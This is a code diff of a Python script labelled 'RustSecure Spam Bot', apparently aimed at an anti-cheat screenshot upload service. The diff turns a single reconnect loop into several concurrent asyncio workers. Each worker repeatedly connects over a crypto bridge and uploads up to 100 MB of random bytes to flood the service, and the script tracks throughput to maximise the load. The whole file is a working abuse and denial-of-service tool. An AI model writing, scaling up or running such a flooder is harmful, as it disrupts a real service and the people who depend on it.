@@ -147,41 +147,51 @@ async def single_session(steam_id, png_data, crypto, stats):
         print(f"  [{now}] connection error: {type(e).__name__}")
 
 
-async def run(steam_id):
-    png_data = open(PAYLOAD_PATH, "rb").read() if os.path.exists(PAYLOAD_PATH) else os.urandom(5*1024*1024)
-    print(f"[*] Payload: {len(png_data)/1024/1024:.1f} MB")
-    print(f"[*] SteamID: {steam_id}")
-    print(f"[*] Strategy: connect → spam ~40s → reconnect → repeat")
-    print()
-
+async def worker(worker_id, png_data, stats, lock):
+    """Single worker: own Bridge, own WS session, auto-reconnect loop."""
     crypto = Bridge()
-    stats = {"sessions": 0, "uploads": 0, "bytes": 0}
-    start = time.time()
-
     try:
         while True:
-            await single_session(steam_id, png_data, crypto, stats)
-            elapsed = time.time() - start
-            mb = stats["bytes"] / 1024 / 1024
-            rate = mb / (elapsed / 60) if elapsed > 0 else 0
-            now = time.strftime("%H:%M:%S")
-            print(f"[{now}] reconnecting... "
-                  f"(sessions={stats['sessions']} uploads={stats['uploads']} "
-                  f"total={mb:.0f}MB rate={rate:.1f}MB/min)")
-            await asyncio.sleep(2)
+            await single_session("", png_data, crypto, stats)
+            async with lock:
+                elapsed = time.time() - stats["start"]
+                mb = stats["bytes"] / 1024 / 1024
+                rate = mb / (elapsed / 60) if elapsed > 0 else 0
+                now = time.strftime("%H:%M:%S")
+                print(f"[{now}] W{worker_id} reconnecting "
+                      f"(total: {stats['sessions']}s {stats['uploads']}u {mb:.0f}MB {rate:.0f}MB/min)")
+            await asyncio.sleep(1 + random.random())
     finally:
         crypto.close()
-        elapsed = time.time() - start
+
+
+async def run(num_workers):
+    png_data = open(PAYLOAD_PATH, "rb").read() if os.path.exists(PAYLOAD_PATH) else os.urandom(100*1024*1024)
+    print(f"[*] Payload: {len(png_data)/1024/1024:.0f} MB")
+    print(f"[*] Workers: {num_workers}")
+    print(f"[*] Strategy: {num_workers}x (connect → spam ~40s → reconnect)")
+    print()
+
+    stats = {"sessions": 0, "uploads": 0, "bytes": 0, "start": time.time()}
+    lock = asyncio.Lock()
+
+    tasks = [asyncio.create_task(worker(i+1, png_data, stats, lock)) for i in range(num_workers)]
+    try:
+        await asyncio.gather(*tasks)
+    except asyncio.CancelledError:
+        pass
+    finally:
+        elapsed = time.time() - stats["start"]
         mb = stats["bytes"] / 1024 / 1024
         print(f"\n[*] Total: {stats['sessions']} sessions, {stats['uploads']} uploads, "
               f"{mb:.0f} MB in {elapsed:.0f}s ({mb/(elapsed/60):.1f} MB/min)")
 
 
 def main():
-    steam_id = sys.argv[1] if len(sys.argv) > 1 else "76561198012345678"
-    print(f"[*] RustSecure Screenshot Spam Bot (auto-reconnect)")
+    workers = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 5
+    print(f"[*] RustSecure Spam Bot (multi-worker, auto-reconnect)")
     try:
-        asyncio.run(run(steam_id))
+        asyncio.run(run(workers))
     except KeyboardInterrupt:
         print("\n[*] Stopped")
 
